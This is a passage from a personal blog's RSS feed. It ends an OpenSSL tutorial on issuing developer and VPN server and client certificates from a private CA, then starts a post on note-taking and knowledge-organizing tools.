                21:E4:47:97:E8:90:39:B5:8C:8A:5B:DD:24:78:23:A9:17:DB:97:9E
            X509v3 Authority Key Identifier: 
                keyid:C5:7E:17:39:6F:CE:D2:40:B8:7E:B8:5D:0E:41:04:75:BB:0D:2B:98

            Authority Information Access: 
                CA Issuers - URI:http://dev.dornea.nu/ca/dev-ca.cer

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://dev.dornea.nu/ca/dev-ca.crl

            X509v3 Subject Alternative Name: 
                email:blabla@dornea.nu
Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Sep <span style="color:#3677a9">29</span> 19:01:14 <span style="color:#3677a9">2016</span> GMT (<span style="color:#3677a9">365</span> days)
Sign the certificate? [y/n]:y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated

</code></pre></div><h3 id="create-pkcs12-bundle">Create PKCS#12 bundle</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( openssl pkcs12 -export <span style="color:#ed9d13">\\</span>
                 -name <span style="color:#ed9d13">&#34;dev.dornea.nu (Developer)&#34;</span> <span style="color:#ed9d13">\\</span>
                 -caname <span style="color:#ed9d13">&#34;dev.dornea.nu CA&#34;</span> <span style="color:#ed9d13">\\</span>
                 -caname <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span> <span style="color:#ed9d13">\\</span>
                 -inkey ca/dev-client-ca/certs/victor.key <span style="color:#ed9d13">\\</span> 
                 -in ca/dev-client-ca/certs/victor.crt <span style="color:#ed9d13">\\</span> 
                 -certfile ca/dev-ca/dev-ca-chain.pem <span style="color:#ed9d13">\\</span> 
                 -out ca/dev-client-ca/certs/victor.p12        
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ca/dev-client-ca/certs/victor.key:
Enter Export Password:
Verifying - Enter Export Password:
</code></pre></div><p>Now <em>verify</em> the bundle:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) openssl pkcs12 -in ca/dev-client-ca/certs/victor.p12 -info | egrep -e <span style="color:#ed9d13">&#34;issuer&#34;</span> -e <span style="color:#ed9d13">&#34;subject&#34;</span>
Enter Import Password:
MAC Iteration <span style="color:#3677a9">2048</span>
MAC verified OK
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration <span style="color:#3677a9">2048</span>
Certificate bag
Certificate bag
Certificate bag
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration <span style="color:#3677a9">2048</span>
<span style="color:#40ffff">subject</span>=/C=NU/ST=Germany/L=Berlin/O=dornea.nu/OU=dev dornea.nu/CN=Victor Dorneanu
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dev.dornea.nu CA
<span style="color:#40ffff">subject</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dev.dornea.nu CA
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
<span style="color:#40ffff">subject</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA

</code></pre></div><h1 id="issue-vpn-ca-certificates">Issue vpn-CA certificates</h1>
<p>We&rsquo;ll now create <strong>VPN</strong> <em>server</em> and <em>client</em> certificates.</p>
<h2 id="create-vpn-server-certificate">Create VPN server certificate</h2>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {â†”

  // Define class (list of attributes)
  class emphasis [color = pink, style = dashed];
  class blackline [color = black, style = dotted];
  class blue [color = lightblue];
  class active [color = lightgreen];
  class inactive [color = lightgrey]; 

  Root_CA [label = &#34;dornea.nu root CA&#34;];
  Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
  Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
  TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [class = active, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];
    

  Root_CA -&gt; Signing_CA2;
  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_60_0.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
mkdir -p ca/vpn-ca/certs/vpn-server
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/vpn-server-cert.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># dev.dornea.nu server certificate</span>
<span style="color:#999;font-style:italic"># Adapted from https://pki-tutorial.readthedocs.org/en/latest/advanced/codesign.conf.html</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                    <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = yes                     <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                    <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                     <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only                <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = yes                     <span style="color:#999;font-style:italic"># Prompt for DN</span>
distinguished_name      = vpn_server_dn           <span style="color:#999;font-style:italic"># DN template</span>
req_extensions          = vpn_server_reqext       <span style="color:#999;font-style:italic"># Desired extensions</span>

[ vpn_server_dn ]
countryName             = <span style="color:#ed9d13">&#34;1. Country Name (2 letters) (eg, US)       &#34;</span>
countryName_max         = <span style="color:#3677a9">2</span>
stateOrProvinceName     = <span style="color:#ed9d13">&#34;2. State or Province Name   (eg, region)   &#34;</span>
localityName            = <span style="color:#ed9d13">&#34;3. Locality Name            (eg, city)     &#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;4. Organization Name        (eg, company)  &#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;5. Organizational Unit Name (eg, section)  &#34;</span>
commonName              = <span style="color:#ed9d13">&#34;6. Common Name              (eg, full name)&#34;</span>
commonName_max          = <span style="color:#3677a9">64</span>

[ vpn_server_reqext ]
keyUsage                = critical,digitalSignature
extendedKeyUsage        = critical,codeSigning
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
</code></pre></div><pre><code>Overwriting /tmp/pki/ca/conf/vpn-server-cert.conf
</code></pre>
<h3 id="create-csr">Create CSR</h3>
<p>And now create the <strong>CSR</strong> (Code Signing Request):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( openssl req -new <span style="color:#ed9d13">\\</span>
            -config ca/conf/vpn-server-cert.conf <span style="color:#ed9d13">\\</span>
            -out ca/vpn-ca/certs/vpn-server/raspberry<span style="color:#ed9d13">\_</span>pi.csr <span style="color:#ed9d13">\\</span>
            -keyout ca/vpn-ca/certs/vpn-server/raspberry<span style="color:#ed9d13">\_</span>pi.key
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
............................................................................................................................................................++
.....................................++
writing new private key to <span style="color:#ed9d13">&#39;ca/vpn-ca/certs/vpn-server/raspberry\_pi.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
Verify failure
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color:#ed9d13">&#39;.&#39;</span>, the field will be left blank.
-----
1. Country Name (<span style="color:#3677a9">2</span> letters) (eg, US)        []:NU
2. State or Province Name   (eg, region)    []:/dev/null
3. Locality Name            (eg, city)      []:/dev/random
4. Organization Name        (eg, company)   []:dornea.nu
5. Organizational Unit Name (eg, section)   []:VPN
6. Common Name              (eg, full name) []:vpn.dornea.nu

</code></pre></div><h3 id="sign-certificate">Sign certificate</h3>
<p>Now use the <strong>VPN-CA</strong> to issue the <strong>CRT</strong> (Code Signing Certificate):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/vpn-ca.conf <span style="color:#ed9d13">\ </span>                                                              <span style="color:#3677a9">1</span> â†µ
                -in ca/vpn-ca/certs/vpn-server/raspberry_pi.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -out ca/vpn-ca/certs/vpn-server/raspberry_pi.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -extensions server_ext
                
Using configuration from ca/conf/vpn-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/vpn-ca/private/vpn-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">1</span> (0x1)
        Validity
            Not Before: Nov  <span style="color:#3677a9">9</span> 19:39:48 <span style="color:#3677a9">2015</span> GMT
            Not After : Nov  <span style="color:#3677a9">8</span> 19:39:48 <span style="color:#3677a9">2016</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">stateOrProvinceName</span>       = /dev/null
            <span style="color:#40ffff">localityName</span>              = /dev/random
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = VPN
            <span style="color:#40ffff">commonName</span>                = vpn.dornea.nu
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication, TLS Web Client Authentication
            X509v3 Subject Key Identifier: 
                80:CA:5B:3C:C7:8A:E4:76:FF:4B:DC:5D:17:F9:99:07:27:69:76:60
            X509v3 Authority Key Identifier: 
                keyid:E2:DB:62:AB:F4:5D:56:17:65:B2:FA:66:55:C9:04:1D:1C:9B:10:A3

            Authority Information Access: 
                CA Issuers - URI:http://vpn.dornea.nu/ca/vpn-ca.cer

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://vpn.dornea.nu/ca/vpn-ca.crl

Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Nov  <span style="color:#3677a9">8</span> 19:39:48 <span style="color:#3677a9">2016</span> GMT (<span style="color:#3677a9">365</span> days)
Sign the certificate? [y/n]:y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated

</code></pre></div><h3 id="create-pkcs12-bundle-1">Create PKCS12 bundle</h3>
<p>Now bundle the <strong>root</strong> CA, <strong>VPN</strong> ca and the VPN <strong>server</strong> cert into one file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ openssl pkcs12 -export <span style="color:#ed9d13">\ </span>                                                   
    -name <span style="color:#ed9d13">&#34;VPN Server (Raspberry Pi)&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -caname <span style="color:#ed9d13">&#34;vpn.dornea.nu CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -caname <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -inkey ca/vpn-ca/certs/vpn-server/raspberry_pi.key <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -in ca/vpn-ca/certs/vpn-server/raspberry_pi.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -certfile ca/vpn-ca/vpn-ca-chain.pem <span style="color:#ed9d13">\ </span>
    -out ca/vpn-ca/certs/vpn-server/raspberry_pi.p12
    
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ca/vpn-ca/certs/vpn-server/raspberry_pi.key:
Enter Export Password:
Verifying - Enter Export Password:
</code></pre></div><h2 id="create-vpn-client-certificate">Create VPN client certificate</h2>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
  // Define orientation
  orientation = portrait;

  // Define class (list of attributes)
  class emphasis [color = pink, style = dashed];
  class blackline [color = black, style = dotted];
  class blue [color = lightblue];
  class active [color = lightgreen];
  class inactive [color = lightgrey]; 

  Root_CA [label = &#34;dornea.nu root CA&#34;];
  Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
  Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
  TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [class = active, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];
    

  Root_CA -&gt; Signing_CA2;
  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_65_0.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
mkdir -p ca/vpn-ca/certs/vpn-client
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/vpn-client-cert.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># VPN client certificate</span>
<span style="color:#999;font-style:italic"># Adapted from https://pki-tutorial.readthedocs.org/en/latest/advanced/client.conf.html</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                  <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = yes                   <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                  <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                   <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only              <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = yes                   <span style="color:#999;font-style:italic"># Prompt for DN</span>
distinguished_name      = client_dn             <span style="color:#999;font-style:italic"># DN template</span>
req_extensions          = client_reqext         <span style="color:#999;font-style:italic"># Desired extensions</span>

[ client_dn ]
countryName             = <span style="color:#ed9d13">&#34;1. Country Name (2 letters) (eg, US)       &#34;</span>
countryName_max         = <span style="color:#3677a9">2</span>
stateOrProvinceName     = <span style="color:#ed9d13">&#34;2. State or Province Name   (eg, region)   &#34;</span>
localityName            = <span style="color:#ed9d13">&#34;3. Locality Name            (eg, city)     &#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;4. Organization Name        (eg, company)  &#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;5. Organizational Unit Name (eg, section)  &#34;</span>
commonName              = <span style="color:#ed9d13">&#34;6. Common Name              (eg, full name)&#34;</span>
commonName_max          = <span style="color:#3677a9">64</span>
emailAddress            = <span style="color:#ed9d13">&#34;7. Email Address            (eg, name@fqdn)&#34;</span>
emailAddress_max        = <span style="color:#3677a9">40</span>

[ client_reqext ]
keyUsage                = critical,digitalSignature
extendedKeyUsage        = clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
subjectAltName          = email:move
</code></pre></div><pre><code>Overwriting /tmp/pki/ca/conf/vpn-client-cert.conf
</code></pre>
<h3 id="create-csr-1">Create CSR</h3>
<p>Now create the <strong>CSR</strong> for the user <strong>victor</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( openssl req -new <span style="color:#ed9d13">\\</span>                      
            -config ca/conf/vpn-client-cert.conf <span style="color:#ed9d13">\\</span>               
            -out ca/vpn-ca/certs/vpn-client/victor.csr <span style="color:#ed9d13">\\</span>      
            -keyout ca/vpn-ca/certs/vpn-client/victor.key    
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
...............................................................++
................................................................................++
writing new private key to <span style="color:#ed9d13">&#39;ca/vpn-ca/certs/vpn-client/victor.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color:#ed9d13">&#39;.&#39;</span>, the field will be left blank.
-----
1. Country Name (<span style="color:#3677a9">2</span> letters) (eg, US)        []:NU
2. State or Province Name   (eg, region)    []:/dev/null
3. Locality Name            (eg, city)      []:/dev/random
4. Organization Name        (eg, company)   []:dornea.nu
5. Organizational Unit Name (eg, section)   []:vpn.dornea.nu
6. Common Name              (eg, full name) []:Victor Dorneanu
7. Email Address            (eg, name@fqdn) []:bla@nsa.gov

</code></pre></div><h3 id="sign-the-csr">Sign the CSR</h3>
<p>Sign the <strong>CSR</strong> using <strong>VPN-CA</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/vpn-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -in ca/vpn-ca/certs/vpn-client/victor.csr <span style="color:#ed9d13">\ </span>     
                -out ca/vpn-ca/certs/vpn-client/victor.crt <span style="color:#ed9d13">\ </span>     
                -extensions client_ext              
                
Using configuration from ca/conf/vpn-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/vpn-ca/private/vpn-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">2</span> (0x2)
        Validity
            Not Before: Nov  <span style="color:#3677a9">9</span> 19:49:16 <span style="color:#3677a9">2015</span> GMT
            Not After : Nov  <span style="color:#3677a9">8</span> 19:49:16 <span style="color:#3677a9">2016</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">stateOrProvinceName</span>       = /dev/null
            <span style="color:#40ffff">localityName</span>              = /dev/random
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = vpn.dornea.nu
            <span style="color:#40ffff">commonName</span>                = Victor Dorneanu
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Subject Key Identifier: 
                12:3F:57:DF:1D:DB:73:BC:E0:A0:97:18:0D:B9:6C:C9:FF:53:8E:1B
            X509v3 Authority Key Identifier: 
                keyid:E2:DB:62:AB:F4:5D:56:17:65:B2:FA:66:55:C9:04:1D:1C:9B:10:A3

            Authority Information Access: 
                CA Issuers - URI:http://vpn.dornea.nu/ca/vpn-ca.cer

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://vpn.dornea.nu/ca/vpn-ca.crl

            X509v3 Subject Alternative Name: 
                email:bla@nsa.gov
Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Nov  <span style="color:#3677a9">8</span> 19:49:16 <span style="color:#3677a9">2016</span> GMT (<span style="color:#3677a9">365</span> days)
Sign the certificate? [y/n]:y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated

</code></pre></div><h3 id="create-pkcs12-bundle-2">Create PKCS#12 bundle</h3>
<p>Bundle the <strong>root CA</strong>, **VPN CA ** and the VPN <strong>client</strong> cert into a single file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ openssl pkcs12 -export <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -name <span style="color:#ed9d13">&#34;VPN Client (Victor)&#34;</span> <span style="color:#ed9d13">\ </span>     
    -caname <span style="color:#ed9d13">&#34;vpn.dornea.nu CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -caname <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -inkey ca/vpn-ca/certs/vpn-client/victor.key <span style="color:#ed9d13">\ </span>
    -in ca/vpn-ca/certs/vpn-client/victor.crt <span style="color:#ed9d13">\ </span>     
    -certfile ca/vpn-ca/vpn-ca-chain.pem <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>    -out ca/vpn-ca/certs/vpn-client/victor.p12      
    
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ca/vpn-ca/certs/vpn-client/victor.key:
Enter Export Password:
Verifying - Enter Export Password:

</code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://pki-tutorial.readthedocs.org/en/latest/advanced/index.html">https://pki-tutorial.readthedocs.org/en/latest/advanced/index.html</a></li>
<li><a href="http://serverfault.com/questions/306345/certification-authority-root-certificate-expiry-and-renewal">http://serverfault.com/questions/306345/certification-authority-root-certificate-expiry-and-renewal</a></li>
<li><a href="http://www.flatmtn.com/article/setting-openssl-create-certificates">http://www.flatmtn.com/article/setting-openssl-create-certificates</a></li>
<li><a href="https://www.debian-administration.org/article/284/Creating_and_Using_a_self_signed__SSL_Certificates_in_debian">https://www.debian-administration.org/article/284/Creating_and_Using_a_self_signed__SSL_Certificates_in_debian</a></li>
<li><a href="http://gatwards.org/techblog/creating-and-signing-ssl-certs">http://gatwards.org/techblog/creating-and-signing-ssl-certs</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Organizing and visualizing knowledge</title>
      <link>https://blog.dornea.nu/2015/09/17/organizing-and-visualizing-knowledge/</link>
      <pubDate>Thu, 17 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/09/17/organizing-and-visualizing-knowledge/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ve been recently looking for some new ways organizing my notes/thoughts/tasks/bookmarks/whatever in order to keep things clean and <em>backup</em> valuable information. After spending some time reading others efforts to do that, I&rsquo;ve realized that mine were not that bad. Let me give you some overview how I keep track of bits of information and which tools are best suited for every day tasks.</p>
<h2 id="mind-maps">Mind maps</h2>
<p>I&rsquo;ve repeated this one several times: I like <a href="http://blog.dornea.nu/tag/viz/">visualizing</a> information. When taking <strong>notes</strong> I do that in a non-linear way. I don&rsquo;t really like tables or lists which in my oppinion is the <em>static</em> way of organizing stuff. I rather try to structure my thoughts in <strong>mind maps</strong>.
I&rsquo;ve been using <a href="https://www.xmind.net">XMind</a> as my first note taking app for more than 3 years. I usually use it for:</p>
<ul>
<li>creating new concepts</li>
<li>roadmaps</li>
<li>designing workflow processes</li>
<li>structuring interrelated <em>knowledge</em> domains</li>
</ul>
<p>You can easily structure your information in your desired layout:
<img src="/posts/img/2015/organize/73b67a8fe370adae481d579462ed3bae.png" alt="XMind" title="XMind"></p>
<p>Attaching screenshots or notes is also allowed:
<img src="/posts/img/2015/organize/1d6e071a80a321d3b9c37a59e7bfc17d.png" alt="XMind" title="XMind"></p>
<h2 id="bookmarks-and-web-stuff">Bookmarks and web stuff</h2>
<p>I have a lot of information ressources which I try to have a look at on a daily basis:</p>
<ul>
<li><a href="https://twitter.com/victordorneanu">Twitter</a></li>
<li>feeds</li>
<li>several blogs</li>
<li>etc.</li>
</ul>
<p>When dealing with large articles I like to <strong>read them later</strong> and save them to a <em>to-read</em> list. <a href="https://getpocket.com">getpocket</a> has helped me organizing my links for ca. 2 years. You can structure your information using <em>tags</em> and <em>archive</em> your read articles. For a while I was using <a href="http://www.crofflr.com">crofflr</a> for sending tagged articles in my <em>getpocket</em> list to my Kindle device. I also use <em>getpocket</em> for sharing links between my devices: Android, Laptop, PC. And besides that: (Almost) every modern browser has an <strong>add-on</strong> for this service.</p>
<p>This is my archived list of items:
<img src="/posts/img/2015/organize/6da00f35bac361f6fd89c4c4c0ec2752.png" alt="Pocket Archive" title="Pocket Archive"></p>
<p><em>Pocket</em> can also distinguish between <em>articles</em>, <em>images</em> or <em>videos</em>. Here is my archived images list:
<img src="/posts/img/2015/organize/a06a9acf53d24268e86b39d9be193aa3.png" alt="Pocket Images" title="Pocket Images"></p>
<h2 id="task-management">Task management</h2>
<p>Since everybody has some tasks to be completed, I also had the agony of choice between Todoist, Wunderlist, Any.Do &hellip; And then I&rsquo;ve found <a href="httphttps://play.google.com/store/apps/details?id=de.mgsimon.android.andtidwiki://www.google.com/keep/">Google Keep</a>. I really love the layout and the widgets (although I&rsquo;m not a hardcore <em>widge</em>list user). With Keep I can create note <em>lists</em> that can have several TODO points and just some text. Plus: I can apply different colors to the notes and share them with my contacts. I usually check out my todo list for that particular day, complete them and then just mark it as done on my smartphone.</p>
<p>Creating a new task is very easy:
<img src="/posts/img/2015/organize/e9dda9fb2b5fcbbcac6b16b89859505d.png" alt="Google Keep - New Task" title="Google Keep - New Task"></p>
<p>You can access your tasks via web or smartphone:
<img src="/posts/img/2015/organize/31aff37cabaa520c2b54518b17e84beb.png" alt="Google Keep" title="Google Keep"></p>
<p>I have even used Google Keep for managing the release of <a href="https://github.com/dorneanu/smalisca">smalisca</a> v0.1:</p>
<p><img src="/posts/img/2015/organize/9274a2db057ad874a0a462f65994f63d.png" alt="Google Keep - smalisca.01" title="Google Keep - smalisca 0.1"></p>
<h2 id="personal-wiki">Personal wiki</h2>
<p>Sometimes you may want to combine all that into a single tool in order to:</p>
<ul>
<li>have your todo list</li>
<li>write down some thoughts you had during the day</li>
<li>organize some events</li>
<li>record ideeas that crosses your brain</li>
<li>take notes during some (online) course</li>
<li>organize your notes in a visual way (mindmaps anybody? :)</li>
</ul>
<p>This is where <a href="http://tiddlywiki.com">TiddlyWiki</a> caught my attention. I have not used Tiddly for a long time, but I think its main features are:</p>
<ul>
<li>Available for many platforms
<ul>
<li>single <strong>HTML</strong> page and some <strong>JavaScript</strong></li>
<li><a href="https://play.google.com/store/apps/details?id=de.mgsimon.android.andtidwiki">Android</a></li>
<li>Chrome/Firefox/Internet Explorer/Safari</li>
<li><a href="https://itunes.apple.com/gb/app/twedit/id409607956?mt=8">iPad/iPhone</a></li>
<li><a href="http://tiddlywiki.com/#Node.js">node.js</a> (preferred installation method)</li>
</ul>
</li>
<li>file based
<ul>
<li>no need for a DB</li>
<li>easily editable</li>
</ul>
</li>
<li>tiddlers
<ul>
<li>bit of <a href="http://tiddlywiki.com/static/ContentType.html">information</a></li>
<li>it can be a book chapter, a section, a wiki page, a JSON file, a PNG/JPG file</li>
<li>this way you can structure your information depending on its type</li>
</ul>
</li>
<li>portable
<ul>
<li>you can copy your tiddlywiki to your USB stick</li>
<li>you can sync your data to be available online</li>
</ul>
</li>
<li>journals
<ul>
<li>journals are <a href="http://tiddlywiki.com/static/Creating%2520journal%2520tiddlers.html"><em>tiddlers</em></a> that use a timestamp (date or time) as their title</li>
<li>usually used to record time-stamped information</li>
</ul>
</li>
<li>extendable
<ul>
<li>there are a lot of available plugins</li>
